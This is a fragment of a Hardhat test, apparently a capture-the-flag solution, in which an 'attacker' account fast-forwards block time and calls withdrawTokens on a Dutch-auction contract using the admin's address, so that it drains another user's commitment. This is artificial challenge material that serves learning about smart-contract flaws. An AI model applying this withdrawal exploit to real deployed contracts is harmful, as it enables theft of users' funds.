...
it("solves the challenge", async function () {
  // console.log(await dutchAuction.commitments[await adminUser.getAddress()])
  await ethers.provider.send("evm_mine", [await (await ethers.provider.getBlock('latest')).timestamp + 110])
  await dutchAuction.connect(attacker).withdrawTokens(await adminUser.getAddress())
  // console.log(await dutchAuction.commitments[await adminUser.getAddress()])
});
